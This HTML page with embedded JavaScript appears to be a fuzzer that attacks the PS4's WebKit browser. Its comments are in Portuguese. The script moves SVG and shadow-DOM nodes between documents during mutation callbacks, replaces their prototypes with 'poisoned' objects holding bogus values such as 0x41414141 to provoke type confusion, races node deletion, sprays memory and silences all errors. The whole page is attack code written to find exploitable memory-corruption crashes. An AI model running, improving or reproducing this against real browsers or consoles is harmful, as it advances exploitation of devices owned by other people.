<!DOCTYPE html>
<html>
<head>
    <title>PS4 Atomic Titan (Gadget Poisoning)</title>
    <style>
        body { background: #000; color: #ff9900; font-family: monospace; overflow: hidden; margin: 0; }
        
        #hud { 
            position: fixed; top: 0; left: 0; width: 100%; 
            background: rgba(20, 10, 0, 0.95); 
            border-bottom: 3px solid #f90; 
            padding: 15px; z-index: 9999;
            font-size: 20px; text-shadow: 0 0 5px #f90;
        }

        .chaos { position: absolute; border: 1px dashed #444; }
    </style>
</head>
<body>
    <div id="hud">
        <div style="display: flex; justify-content: space-between;">
            <span>ATOMIC TITAN: <span style="color:lime">ARMADO</span></span>
            <span id="heartbeat" style="font-size: 24px;">☢</span>
        </div>
        <div style="margin-top: 5px; font-size: 16px; color: #aaa;">
            SEED: <span id="seed-disp" style="color:white; font-weight:bold;">...</span> | 
            NODES: <span id="nodes-count">0</span> | 
            GADGETS: <span id="gadget-status" style="color:#ff3333">OFF</span>
        </div>
    </div>

    <iframe id="victim-frame" style="width:1px; height:1px; opacity:0; position:absolute;"></iframe>
    
    <div id="arena" style="margin-top: 100px;"></div>

    <script>
        // ================= CONFIGURAÇÃO ATÔMICA =================
        const MAX_NODES = 800; 
        // ========================================================

        let currentSeed = parseInt(localStorage.getItem('atom_seed') || Math.floor(Math.random() * 100000));
        localStorage.setItem('atom_last_start', currentSeed);

        function seed(s) { currentSeed = s; }
        function rnd() {
            var t = currentSeed += 0x6D2B79F5;
            t = Math.imul(t ^ t >>> 15, t | 1);
            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
            return ((t ^ t >>> 14) >>> 0) / 4294967296;
        }
        function coinflip() { return rnd() > 0.5; }

        // UI Elements
        const seedSpan = document.getElementById('seed-disp');
        const nodesSpan = document.getElementById('nodes-count');
        const beatSpan = document.getElementById('heartbeat');
        const gadgetStatus = document.getElementById('gadget-status');
        const arena = document.getElementById('arena');
        const frame = document.getElementById('victim-frame');

        let liveNodes = [];
        let cycleCount = 0;
        let popupWindow = null;

        // --- GERENCIADOR DE JANELA ---
        function managePopup() {
            if (cycleCount % 60 === 0) {
                if (popupWindow) {
                    popupWindow.close();
                    popupWindow = null;
                } else {
                    popupWindow = window.open('about:blank', 'atom_pop', 'width=10,height=10');
                }
            }
        }

        // 1. CRIAÇÃO (Estruturas SVG Complexas)
        function createAtomicNode() {
            let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            let foreign = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
            let div = document.createElement("div");
            
            div.className = "chaos";
            // Mistura SVG com ShadowDOM (Área cinzenta do WebKit)
            if (div.attachShadow && coinflip()) {
                try {
                    let sh = div.attachShadow({mode: coinflip() ? 'open' : 'closed'});
                    sh.innerHTML = "<slot></slot><canvas width='10' height='10'></canvas>";
                } catch(e){}
            }

            foreign.appendChild(div);
            svg.appendChild(foreign);
            return svg;
        }

        // 2. ATAQUE AOS GADGETS (Baseado no seu LOG)
        // Aqui injetamos o veneno específico que o "Suite" descobriu
        function prepareGadgetTrap() {
            // Objeto tóxico que imita o protótipo mas com tipos errados
            return {
                // O log disse que 'isAdmin' e 'addEventListener' são vulneráveis
                isAdmin: true, 
                
                // Type Confusion: O motor espera Função, nós damos Inteiro
                addEventListener: 0x41414141, 
                removeEventListener: 0x42424242,
                
                // Crash bait: Se o motor tentar anexar esse nó, vai falhar
                appendChild: "CRASH_ME",
                
                // Gadgets extras detectados
                map: 1,
                filter: 1
            };
        }

        // 3. O DETONADOR (Cross-Doc + Poisoning)
        function triggerAtomicEvent(el) {
            try {
                let targetWin = (popupWindow && !popupWindow.closed) ? popupWindow : frame.contentWindow;
                if (!targetWin) return;
                let otherDoc = targetWin.document;

                let obs = new MutationObserver((mutations) => {
                    let t = mutations[0].target;
                    t.textContent = ""; // Limpa conteúdo durante movimento
                    if (t.parentNode) t.parentNode.removeChild(t);
                });
                obs.observe(el, { attributes: true, childList: true, subtree: true });

                // === FASE 1: Move para área alienígena ===
                otherDoc.adoptNode(el);
                otherDoc.body.appendChild(el);

                // === FASE 2: INJEÇÃO DE GADGETS (A ATUALIZAÇÃO) ===
                // Substituímos o __proto__ vazio pelos gadgets tóxicos descobertos
                try {
                    el.__proto__ = prepareGadgetTrap();
                    gadgetStatus.innerText = "POISONED"; // Feedback visual
                    
                    // Força o navegador a ler o veneno
                    let _ = el.addEventListener; 
                    let __ = el.appendChild;
                } catch(e) {}

                // === FASE 3: Traz de volta (com o veneno ativo) ===
                document.adoptNode(el);
                arena.appendChild(el);
                
                obs.disconnect();
            } catch(e) {}
        }

        function stressLayout(el) {
            try {
                let _ = el.getBoundingClientRect().top;
                el.style.transform = `rotate(${rnd()%360}deg)`; 
                _ = el.offsetHeight;
            } catch(e){}
        }

        async function loop() {
            while(true) {
                cycleCount++;
                seedSpan.innerText = currentSeed;
                nodesSpan.innerText = liveNodes.length;
                beatSpan.style.opacity = (beatSpan.style.opacity == "1") ? "0.2" : "1";

                managePopup();

                if (cycleCount % 50 === 0) localStorage.setItem('atom_seed', currentSeed);

                // Pausa para renderizar HUD
                await new Promise(r => setTimeout(r, 20)); 
                gadgetStatus.innerText = "SCANNING";

                for(let k=0; k < 20; k++) { 
                    seed(currentSeed);

                    // NASCIMENTO
                    if (liveNodes.length < MAX_NODES) {
                        let el = createAtomicNode();
                        arena.appendChild(el);
                        liveNodes.push(el);
                    }

                    // ATAQUE
                    let victim = liveNodes[Math.floor(rnd() * liveNodes.length)];
                    if (victim) {
                        if (coinflip()) triggerAtomicEvent(victim);
                        stressLayout(victim);
                    }

                    // MORTE
                    if (liveNodes.length > MAX_NODES * 0.80) {
                        let idx = Math.floor(rnd() * liveNodes.length);
                        let dying = liveNodes[idx];
                        liveNodes.splice(idx, 1);
                        
                        // Race Condition na deleção
                        if (coinflip()) {
                            setTimeout(() => { try{ dying.remove(); }catch(e){} }, 0);
                        } else {
                            try{ dying.remove(); }catch(e){}
                        }
                    }
                    rnd(); 
                }
                
                currentSeed++;

                // Limpeza de Memória a cada 200 ciclos
                if (cycleCount % 200 === 0) {
                    let junk = new ArrayBuffer(1024 * 512); // Pequeno spray
                    junk = null;
                }
            }
        }

        window.onerror = function() { return true; };

        document.getElementById('seed-disp').innerText = "INICIANDO...";
        setTimeout(loop, 500);

    </script>
</body>
</html>
